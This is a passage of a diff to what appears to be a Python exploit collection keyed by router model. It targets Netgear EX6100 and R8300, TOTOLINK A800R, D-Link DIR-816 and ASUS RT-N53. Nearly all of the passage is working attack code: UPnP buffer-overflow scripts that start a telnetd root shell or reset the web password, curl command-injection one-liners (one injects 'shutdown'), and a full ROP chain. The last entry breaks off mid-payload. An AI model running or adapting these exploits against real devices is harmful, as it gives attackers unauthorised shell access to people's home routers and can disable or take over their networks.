+    print("if you firmware version is EX6100-V1.0.2.28_1.1.138.chk or please EX6100-V1.0.2.28_1.1.136 id is 1")
+    print("if you firmware version is EX6100-V1.0.2.24_1.1.134.chk id is 2")
+    exit(0)
+
+def generate_payload():
+    global target_version,request,choice
+    if target_version=="1": 
+            system_addr=0x00422848
+            change_password=0x042C550
+    if target_version=="2":
+            system_addr=0x422828
+            change_password=0x042C530
+    aim=0
+    print("1.open telnetd 25\\n2.change http password (NULL)")
+    choice=int(input())
+    if(choice==1):
+        aim=system_addr
+        request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"
+        request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"
+        request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"
+        request += b"NT: upnp:event\\n"
+        request += b"Timeout: Second-1800\\n"
+        request += b"Accept-Encoding: gzip, deflate\\n"
+        request += request+b"doud"
+        request += request
+        request = request.ljust(0x1f00,b"a")
+        request += p32(0x7fff7030)
+        request = request.ljust(0x1f48-0x14,b"a")
+        request += p32(aim)
+    if(choice==2):
+        aim=change_password
+        request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"
+        request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"
+        request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"
+        request += b"NT: upnp:event\\n"
+        request += b"Timeout: Second-1800\\n"
+        request += b"Accept-Encoding: gzip, deflate\\n"
+        request += request+b"doud"
+        request += request
+        request = request.ljust(0x1f00,b"a")
+        request += p32(0x7fff7030)
+        request += p32(0x7fff7030)*12
+        request += p32(0x42C550)
+        request += p32(aim)
+
+
+def attack():
+    p=remote(target_ip,5000)
+    p.send(request)
+    if(choice==1):
+        os.system("telnet %s 25"%(target_ip))
+if __name__=="__main__":
+    generate_payload()
+    attack()
+""" 
+ ]
 }
 
 model_exp_dic["TOTOLINK_A800R"] = {
     "A800R_Command_inject": ["unauth rce downloadFlile.cgi", "curl -v 'http://192.168.2.10/cgi-bin/downloadFlile.cgi?;command;'"]
 }
 
 model_exp_dic["wavlink_WL-WN535K3"] = {
@@ -381,15 +451,16 @@
 }
 
 model_exp_dic["DIR-816"] = {
     "CVE-2021-39510":
 ["An issue was discovered in D-Link DIR816_A1_FW101CNB04 750m11ac wireless router, The HTTP request parameter is used in the handler function of /goform/form2userconfig.cgi route, which can construct the user name string to delete the user function. This can lead to command injection through shell metacharacters.\n['https://github.com/doudoudedi/main-DIR-816_A1_Command-injection', 'https://github.com/doudoudedi/main-DIR-816_A1_Command-injection/blob/main/injection_A1.md', 'https://www.dlink.com/en/security-bulletin/']", '\ncurl -s http://192.168.33.9/dir_login.asp  | grep tokenid\ncurl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Admin\';shutdown;\'&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"\n'],
 "CVE-2021-39509":
 ["An issue was discovered in D-Link DIR-816 DIR-816A2_FWv1.10CNB05_R1B011D88210 The HTTP request parameter is used in the handler function of /goform/form2userconfig.cgi route, which can construct the user name string to delete the user function. This can lead to command injection through shell metacharacters.\n['https://github.com/doudoudedi/main-DIR-816_A2_Command-injection', 'https://github.com/doudoudedi/main-DIR-816_A2_Command-injection/blob/main/injection.md', 'https://www.dlink.com/en/security-bulletin/']", '\ncurl -s http://192.168.33.9/dir_login.asp  | grep tokenid\ncurl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=IjtyZWJvb3Q7Ig==&oldpass=123&newpass=MTIz&confpass=MTIz&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=xxxxx"#input id\n'],
-"stackover_flow_host":["unauth stackoverflow",
+"stackover_flow_host":
+["unauth_stackoverflow",
 """
 # Tested product: DIR-816 (CN)
 # Hardware version: A2
 # Firmware version: v1.10B05 (2018/01/04)
 # Firmware name: DIR-816A2_FWv1.10CNB05_R1B011D88210.img
 #
 import socket
@@ -491,15 +562,15 @@
 model_exp_dic["RT-N53"] = {
     "CVE-2019-20082":
    ["ASUS RT-N53 3.0.0.4.376.3754 devices have a buffer overflow via a long lan_dns1_x or lan_dns2_x parameter to Advanced_LAN_Content.asp.\n['https://github.com/pr0v3rbs/CVE/tree/master/CVE-2019-20082', 'https://www.asus.com']", ' \n#!/usr/bin/env python3\n\nimport requests\n\nIP = input(\'Target IP:\').strip()\n\nreq = requests\n\nheaders = requests.utils.default_headers()\nheaders["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"\nheaders["Referer"] = "http://" + IP + "/"\n\nbuf = \'a\'*128\npayload = {\'productid\': \'RT-N53\', \'current_page\': \'Advanced_LAN_Content.asp\', \'next_page\': \'\', \'group_id\': \'\', \'modified\': \'0\', \'action_mode\': \'apply_new\', \'action_script\': \'restart_net_and_phy\', \'action_wait\': \'35\', \'preferred_lang\': \'EN\', \'firmver\': \'3.0.0.4\', \'wan_ipaddr_x\': \'\', \'wan_netmask_x\': \'\', \'wan_proto\': \'dhcp\', \'lan_proto\': \'static\', \'lan_dnsenable_x\': \'0\', \'lan_ipaddr_rt\': \'192.168.1.1\', \'lan_netmask_rt\': \'255.255.255.0\', \'lan_proto_radio\': \'static\', \'lan_ipaddr\': \'192.168.1.1\', \'lan_netmask\': \'255.255.255.0\', \'dhcp_start\': \'192.168.1.2\', \'dhcp_end\': \'192.168.1.254\', \'lan_gateway\': \'0.0.0.0\', \'lan_dnsenable_x_radio\': \'0\', \'lan_dns1_x\': buf, \'lan_dns2_x\':\'\'}\n\nreq.post(\'http://{}/start_apply.htm\'.format(IP), headers=headers, data=payload, timeout=10)\nprint(\'sent buffer overflow packet\')\n        ']
 }
 
 model_exp_dic["Netgear_R8300"] = {
     "PSV-2020-0211":
-["Security Advisory for Pre-Authentication Command Injection on R8300, PSV-2020-0211", '\nimport socket\nimport time\nimport sys\nfrom struct import pack\n# NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130\n# Date : 2020.03.09\n# POC : system("telnetd -l /bin/sh -p 9999& ") Execute\n# Desc : execute telnetd to access router\n# by python2\np32 = lambda x: pack("<L", x)\npayload = \'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7ABBBc9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7DDDBa9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7 AAA Aa9CbEEEECb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F\'\nexpayload = \'\'\npayload = payload.replace(\'z3Bz\',\'\\xff\\xff\\x1b\\x40\') # Need to Existed Address\npayload = payload.replace(\' AAA \',\'\\xf0\\x30\\x02\\x00\') #change eip\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nbssBase = 0x9E150   #string bss BASE Address\nexpayload += \'a\' * 4550\nexpayload += p32(bssBase+3) # R4 Register\nexpayload += p32(0x3F340) # R5 Register //tel\nexpayload += \'IIII\' # R6 Register\nexpayload += \'HHHH\' # R7 Register\nexpayload += \'GGGG\' # R8 Register\nexpayload += \'FFFF\' # R9 Register\nexpayload += p32(bssBase) # R10 Register\nexpayload += \'BBBB\' # R11 Register\nexpayload += p32(0x13644) # strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+6) #R4\nexpayload += p32(0x423D7) #R5  //telnet\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+8) #R4\nexpayload += p32(0x40CA4 ) #R5  //telnetd\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+10) #R4\nexpayload += p32(0x4704A) #R5  //telnetd\\x20-l\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+11) #R4\nexpayload += p32(0x04C281) #R5  //telnetd\\x20-l/bin/\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+16) #R4\nexpayload += p32(0x40CEC) #R5  //telnetd\\x20-l/bin/\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+18) #R4\nexpayload += p32(0x9CB5) #R5  //telnetd\\x20-l/bin/sh\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+22) #R4\nexpayload += p32(0x41B17) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+24) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x2099\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+26) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+28) #R4\nexpayload += p32(0x4A01D) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+30) #R4\nexpayload += p32(0x461C1) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\\x20\\x00\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nprint "[*] Make Payload ..."\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase) #R4\nexpayload += p32(0x47398) #R5\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x1A83C) #system(string) telnetd -l\ns.connect((\'239.255.255.250\', 1900))\nprint "[*] Send Proof Of Concept payload"\ns.send(\'a\\x00\'+expayload)#expayload is rop gadget\ns.send(payload)\ndef checkExploit():\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntry:\n    ret = soc.connect((\'192.168.1.1\',9999))\n    return 1\nexcept:\n    return 0\ntime.sleep(5)\nif checkExploit():\n    print "[*] Exploit Success"\n    print "[*] You can access telnet 192.168.1.1 9999"\nelse:\n    print "[*] Need to Existed Address cross each other"\n    print "[*] You need to reboot or execute upnpd daemon to execute upnpd"\n    print "[*] To exploit reexecute upnpd, description"\n    print "[*] Access http://192.168.1.1/debug.htm and enable telnet"\n    print "[*] then, You can access telnet. execute upnpd(just typing upnpd)"\ns.close()\nprint(Done)\n        ']
+["Security Advisory for Pre-Authentication Command Injection on R8300, PSV-2020-0211", '\nimport socket\nimport time\nimport sys\nfrom struct import pack\n# NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130\n# Date : 2020.03.09\n# POC : system("telnetd -l /bin/sh -p 9999& ") Execute\n# Desc : execute telnetd to access router\n# by python2\np32 = lambda x: pack("<L", x)\npayload = \'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7ABBBc9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7DDDBa9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7 AAA Aa9CbEEEECb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr